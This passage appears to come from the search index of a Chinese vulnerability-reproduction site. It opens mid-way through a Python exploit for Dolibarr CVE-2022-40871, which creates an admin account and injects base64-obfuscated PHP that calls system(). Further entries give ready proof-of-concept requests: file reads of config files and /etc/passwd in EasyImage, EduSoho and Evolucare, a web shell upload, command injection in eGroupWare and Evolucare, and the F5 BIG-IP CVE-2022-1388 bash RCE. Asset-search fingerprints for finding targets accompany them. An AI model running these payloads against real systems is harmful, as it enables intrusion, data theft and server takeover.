'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'} proxies = None res = request('GET', base, headers=headers, proxies=proxies) err_flag = 1 if res: print('[*] Attempt to add admin.') base = res.url.rsplit('/', 1)[0] add_admin_url = '{}/install/step5.php'.format(base) data = { 'action': 'set', 'login': 'testadmins', 'pass': 'testadmins', 'pass_verif': 'testadmins', 'selectlang': 'auto' } headers['Content-Type'] = 'application/x-www-form-urlencoded' res = request('POST', add_admin_url, headers=headers, data=data, proxies=proxies) if res and 'created successfully' in res.text or ('exists' in res.text and 'Email already exists' not in res.text): csrf_token_url = '{}/index.php'.format(base) res = request('GET', csrf_token_url, headers=headers, proxies=proxies) if res: print('[*] Attempt to login.') try: csrf_token = pcre.findall(res.text)[0] except: csrf_token = '' login_url = '{}/index.php?mainmenu=home'.format(base) headers['Referer'] = csrf_token_url data = { 'token':'{}'.format(csrf_token), 'actionlogin': 'login', 'loginfunction': 'loginfunction', 'username': 'testadmins', 'password': 'testadmins' } res = request('POST', login_url, headers=headers, data=data, proxies=proxies) if res and res.status_code == 200 and 'logout.php' in res.text: print('[*] Attempt to get csrf token.') csrf_token_url = '{}/admin/menus/edit.php?menuId=0\u0026action=create\u0026menu_handler=eldy_menu'.format(base) res = request('GET', csrf_token_url, headers=headers, proxies=proxies) if res: print('[*] Attemp to inset evil data.') try: csrf_token = pcre.findall(res.text)[0] except: csrf_token = '' inset_evil_url = '{}/admin/menus/edit.php'.format(base) data = { 'token': '{}'.format(csrf_token), 'action': 'add', 'menuId': random.randint(10000, 99999), 'menu_handler': 'eldy_menu', 'user': 2, 'type': 1, 'titre': 1, 'url': 1, 'enabled': \"1==1));$d=base64_decode('ZWNobyAnPCEtLScmJmVjaG8gcHduZWQhISEmJmlkJiZlY2hvJy0tPic=');$a=base64_decode('c3lzdGVt');$a($d);//\" #execute id command，bypass core/lib/function.lib.php limits } res = request('POST', inset_evil_url, headers=headers, data=data, proxies=proxies) if res and res.history[0].status_code == 302: print('[*] Attemp to execute command.') request('GET', '{}/admin/menus/index.php'.format(base), headers=headers, proxies=proxies) time.sleep(3) evil_url = '{}/admin/index.php'.format(base) res = request('GET', evil_url, headers=headers, proxies=proxies) if res and res.status_code == 200 and 'pwned!!!' in res.text: print(res.text[:100]) print('[+] vulnrable! {}'.format(base)) err_flag = 0 if err_flag: print('[-] {} is not exploitable.'.format(sys.argv[1])) exp() ","date":"0001-01-01","objectID":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/:5:0","tags":null,"title":"","uri":"/dolibarr-edit.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40871/"},{"categories":null,"content":"E-message 越权访问漏洞 ","date":"0001-01-01","objectID":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 E-message 存在越权访问漏洞，由于配置页面没有做权限设定，导致攻击者可以访问并重置账号密码等操作 ","date":"0001-01-01","objectID":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 E-message ","date":"0001-01-01","objectID":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"emessage 设置: 数据库设置 - 标准连接\" ","date":"0001-01-01","objectID":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问安装页面 http://xxx.xxx.xxx.xxx/setup/setup-datasource-standard.jsp 可以获取账号密码信息，一路点击右下角的继续将会跳转修改管理员账号密码页面，修改后登录即可获取后台权限 ","date":"0001-01-01","objectID":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/e-message-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"EasyImage down.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 EasyImage down.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件 ","date":"0001-01-01","objectID":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 EasyImage ","date":"0001-01-01","objectID":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"EasyImage-简单图床\" ","date":"0001-01-01","objectID":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /application/down.php?dw=./config/config.php ","date":"0001-01-01","objectID":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/easyimage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"EasyImage manager.php 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 EasyImage manager.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件到服务器获取服务器权限 ","date":"0001-01-01","objectID":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 EasyImage ","date":"0001-01-01","objectID":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"EasyImage-简单图床\" ","date":"0001-01-01","objectID":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 登陆后台后发送POC (通过任意文件读取获取账号密码) POST /admin/manager.php?p= HTTP/1.1 Host: Accept: application/json Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cache-Control: no-cache Content-Length: 1622 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEUCF9Yq83AkaO6sv Cookie: Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680341989; auth=a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22tossone%22%3Bi%3A1%3Bs%3A32%3A%22590368bca375c2f8fe93df7d253481e8%22%3B%7D; Hm_lpvt_c790ac2bdc2f385757ecd0183206108d=1680342144; filemanager=sdeemhj3b9aeoretftrlijjh25 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"dzuuid\" 7e4fad9a-3545-4ed6-b655-b3e3a6b2978c ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"dzchunkindex\" 0 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"dztotalfilesize\" 583 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"dzchunksize\" 10000000 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"dztotalchunkcount\" 1 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"dzchunkbyteoffset\" 0 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"p\" ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"fullpath\" shell.php ------WebKitFormBoundaryEUCF9Yq83AkaO6sv Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\" Content-Type: application/octet-stream 234 ------WebKitFormBoundaryEUCF9Yq83AkaO6sv-- 上传访问地址为 /i/shell.php ","date":"0001-01-01","objectID":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/easyimage-manager.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"EduSoho 教培系统 app_dev.php 任意读取漏洞 ","date":"0001-01-01","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。 通过向 /app_dev.php/_profiler/open 端点发送可以读取到 app/config/parameters.yml 文件的内容，拿到该文件中保存的 secret 值以及数据库账号密码等敏感信息。 ","date":"0001-01-01","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 EduSoho 教培系统 ","date":"0001-01-01","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Powered By EduSoho\" ","date":"0001-01-01","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 指纹 poc GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1 Host: Accept: */* Content-Type: application/x-www-form-urlencoded ","date":"0001-01-01","objectID":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/edusoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"eGroupWare spellchecker.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 eGroupWare是一个多用户，在以PHP为基础的API上的定制集为基础开发的，以WEB为基础的工作件套装，其中 spellchecker.php 文件中存在命令执行漏洞 ","date":"0001-01-01","objectID":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 eGroupWare ","date":"0001-01-01","objectID":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"EGROUPWARE-产品\" ","date":"0001-01-01","objectID":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cid%7C%7C ","date":"0001-01-01","objectID":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/egroupware-spellchecker.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Evolucare Ecsimaging download_stats_dicom.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Evolucare Ecsimaging download_stats_dicom.php 存在文件读取漏洞,攻击者可利用该漏洞获取系统敏感信息等. ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 EVOLUCARE Evolucare Ecsimaging 6.21.5 ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"ECSimaging\" ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /download_stats_dicom.php?fullpath=/etc/passwd\u0026filename=/etc/passwd ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-download_stats_dicom.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Evolucare Ecsimaging new_movie.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 EVOLUCARE ECSimage是一款国外使用的医疗管理系统，研究发现其new_movie.php接口中存在命令注入漏洞,攻击者可利用该漏洞获取系统敏感信息等. ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 EVOLUCARE Evolucare Ecsimaging 版本\u003c 6.21.5 ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"ECSimaging\" ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /new_movie.php?studyUID=1\u0026start=2\u0026end=2\u0026file=1;pwd ","date":"0001-01-01","objectID":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/evolucare-ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"F5 BIG-IP iControl REST身份认证绕过漏洞 CVE-2022-1388 ","date":"0001-01-01","objectID":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/:0:0","tags":null,"title":"","uri":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/"},{"categories":null,"content":"漏洞描述 BIG-IP 是 F5 公司的一款应用交付服务是面向以应用为中心的世界先进技术。借助 BIG-IP 应用程序交付控制器保持应用程序正常运行。BIG-IP 本地流量管理器 (LTM) 和 BIG-IP DNS 能够处理应用程序流量并保护基础设施。未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。 ","date":"0001-01-01","objectID":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/:1:0","tags":null,"title":"","uri":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/"},{"categories":null,"content":"漏洞影响 11.6.1-16.1.2 ","date":"0001-01-01","objectID":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/:2:0","tags":null,"title":"","uri":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/"},{"categories":null,"content":"网络测绘 icon_hash=\"-335242539\" ","date":"0001-01-01","objectID":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/:3:0","tags":null,"title":"","uri":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包(Host设为localhost) POST /mgmt/tm/util/bash HTTP/1.1 Host: localhost Authorization: Basic YWRtaW46 X-F5-Auth-Token: a Connection: close, X-F5-Auth-Token Content-Length: 39 {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} 文件读取： https://your-ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd RCE RCE： https://your-ip/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin 检测脚本：https://github.com/jheeree/CVE-2022-1388-checker/blob/main/CVE-2022-1388.sh 使用方法： ./CVE-2022-1388.sh hosts.txt ","date":"0001-01-01","objectID":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/:4:0","tags":null,"title":"","uri":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/"},{"categories":null,"content":"漏洞修复 建议升级至最新版本或可参考官方修复建议 Recommended Actions：https://support.f5.com/csp/article/K23605346 在受影响的版本内可执行以下步骤以缓解攻击： 通过自身 IP 地址阻止 iControl REST 访问。 通过管理界面阻止 iControl REST 访问。 修改 BIG-IP httpd 配置。 ","date":"0001-01-01","objectID":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/:5:0","tags":null,"title":"","uri":"/f5-big-ip-icontrol-rest%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-1388/"},{"categories":null,"content":"F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:0:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"漏洞描述 2020年07月03日， 360CERT监测发现 F5 发布了 F5 BIG-IP 远程代码执行 的风险通告，该漏洞编号为 CVE-2020-5902，漏洞等级：严重。 未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:1:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"漏洞影响 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 ","date":"0001-01-01","objectID":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/:2:0","tags":null,"title":"","uri":"/f5-big-ip-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-5902/"},{"categories":null,"content":"网络测绘 title=\"BIG-IP\u0026reg ;- Redirect\" 